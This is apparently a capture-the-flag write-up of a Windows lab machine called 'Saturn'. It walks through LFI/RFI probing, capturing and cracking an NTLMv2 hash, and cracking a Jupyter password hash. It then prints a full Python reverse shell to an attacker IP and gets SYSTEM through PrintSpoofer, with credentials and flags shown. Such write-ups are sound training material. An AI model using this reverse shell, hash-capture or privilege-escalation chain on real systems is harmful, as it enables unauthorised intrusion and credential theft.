# Saturn - User

The challenge consisted of 3 IPs which all were the same type of machines.

10.10.10.93, 10.10.10.103 & 10.10.10.123.

We begin with a basic nmap and discover some ports

```python
nmap 10.10.10.93
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 17:40 AEST
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 17:40 (0:00:00 remaining)
Nmap scan report for 10.10.10.93
Host is up (0.39s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
443/tcp  open  https
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
```

As always, the web ports are always checked first. We see a search field

![](writeupfiles/Untitled.png)

Doing a basic search gives us a query in the URI

![](writeupfiles/Untitled%201.png)

Upon not finding anything else that was exploitable, we fuzzed the query for Local File Inclusion (LFI) vulnerabilities

```python
wfuzz -u https://10.10.10.93/index.php?url=FUZZ --hl 36 -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

```

Some basic LFI vulnerable paths were returned.

Using the Wappalyzer FireFox addon, we discover that the server is running Windows Server

![](writeupfiles/Untitled%202.png)

After not being able to read any files on the server such as `/etc/hosts` or `win.ini`, we attempted a Remote File Inclusion (RFI) vulnerability.

We tried to load `test.txt` by navigating to our smbserver we had setup. A simple RFI vulnerability

![](writeupfiles/Untitled%203.png)

We were able to get a hit on our `smbserver.py`, but no files were able to load via the web browser. We do however see a user and hash presented to us.

```python
smbserver.py share .

[-] TreeConnectAndX not found share
[*] Closing down connection (10.10.10.93,54738)
[*] Remaining connections []
```

After discovering that a reverse shell or web shell was also not possible, [`Responder.py`](http://responder.py) was used to obtain the NTLMv2 password hash of the Plagcheck user. This was done by using the above `[smbserver.py](http://smbserver.py)` command and navigating to `https://10.10.10.93/index.php?url=smb://10.10.14.61/share/test.txt`.

The hash was then cracked using the below command

```python
john --wordlist=/usr/share/wordlists/rockyou.txt saturn.hash
```

 The cracked password was: `Nat9m7starfox`

We used `smbclient` to enumerate available shares. The **backup** share was of interest

```python
smbclient -L //10.10.10.103 -U plagcheck
Enter WORKGROUP\plagcheck's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

After navigating to the backup share, we retrieved the files found inside

```python
smbclient //10.10.10.103/backup -U plagcheck
Enter WORKGROUP\plagcheck's password: 
Try "help" to get a list of possible commands.

getting file \pwgen.txt of size 106800 as pwgen.txt (43.2 KiloBytes/sec) (average 43.2 KiloBytes/sec)

getting file \jupyter_notebook_config.json.bak of size 107 as jupyter_notebook_config.json.bak (0.1 KiloBytes/sec) (average 26.4 KiloBytes/sec)
```

Looking at `jupyter_notebook_config.json.bak`, we discover that its a salted SHA1 hash

```python
cat jupyter_notebook_config.json.bak 
{
  "NotebookApp": {
    "password": "sha1:c5ac4c24e5aa:9f7d3f2a9213d3f233993113575464ba3079e47b"
  }
}
```

Looking at `pwgen.txt` we notice what looks like a lot of passwords

```python
cat pwgen.txt 
I generated some passwords we can use for our jupyter server, we will never have a weak password again! Even if someone had this list, it's way too many passwords to try them all on our server.

```

The output of the file has not been included as it is 1668 lines long. The long file was turned into a pasword list file by reducing the file from 3 columns into one by using the below command

```python
sed 's/ /\n/g' pwgen.txt > passwords.txt
```

The salted SHA1 hash was appended into a file that looked like the below

```python
cat jupiter.hash 
9f7d3f2a9213d3f233993113575464ba3079e47b:c5ac4c24e5aa
```

Hashcat was then used to try crack the hash

```python
hashcat -m 110 jupiter.hash passwords.txt
```

![](writeupfiles/Untitled%204.png)

The cracked password was: `ak1je3Bai8noo9soo3fo` as shown above.

After cracking the password, we navigated to port 8080 which was a login screen for an open-source web application called Jupyter Notebook. The above password was used to obtain access to the application.

Jupyter Notebook is something I have played around with in the past but never in a malicious way. After printing something simple like **Hello World**, I tried something more useful like asking the server `whoami`. After playing around with some of the Python code, we were able to obtain RCE

```python
from subprocess import getoutput
getoutput("whoami")
```

![](writeupfiles/Untitled%205.png)

After a short amount of time, we turned RCE into a reverse shell by utilizing the below code

```python
import os,socket,subprocess,threading;

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.19",4444))

p=subprocess.Popen(["\windows\system32\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

A `nc` was setup and this landed us a user shell as the jupiter user

![](writeupfiles/Untitled%206.png)

The user flag was obtained and submitted

```python
C:\>type C:\users\Jupiter\desktop\user.txt
type C:\users\Jupiter\desktop\user.txt
16a937efbfd2498109579fc0f8b60253
```

It is worth noting we were the 2nd team to submit this flag.

# Saturn - Root

Onto privilege escalation now. We used the `systeminfo` command to tell us the Operating System of the Windows server

```python
c:\users\jupiter\documents>systeminfo
systeminfo

Host Name:                 SATURN
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
```

It is worth noting that Windows Server 2019 is vulnerable to the PrintSpoofer exploit so this was obtained from Github and transferred onto the box using `Invoke-WebRequest`. Before all of this however, the `powershell` command was used to execute PowerShell which enabled us to use the below command

```python
Invoke-WebRequest -Uri http://10.10.14.19:8000/PrintSpoofer.exe -OutFile C:\Windows\System32\spool\drivers\color\ps.exe
```

PrintSpoofer was executed with the `whoami` command which told us we were SYSTEM

```python
C:\Windows\System32\spool\drivers\color>.\ps.exe -i -c whoami
.\ps.exe -i -c whoami
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
nt authority\system
```

Using PrintSpoofer again, we used the `cmd` command to give us a elevated cmd shell as SYSTEM

```python
C:\Windows\System32\spool\drivers\color>.\ps.exe -i -c cmd    
.\ps.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We were then able to read the root flag, and get first blood on the FullPwn challenge!

```python
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
613d0a8b84f894ce93efcc2e4b2f2779
```
**Bonus**:

We were able to brute-force the SIDs to obtain the users of the box before getting a user shell:

```python
500: SATURN\Administrator (SidTypeUser)
501: SATURN\Guest (SidTypeUser)
503: SATURN\DefaultAccount (SidTypeUser)
504: SATURN\WDAGUtilityAccount (SidTypeUser)
513: SATURN\None (SidTypeGroup)
1000: SATURN\Plagcheck (SidTypeUser)
1001: SATURN\Jupiter (SidTypeUser)
```

**Bonus 2**:

The Search field was also vulnerable to XSS
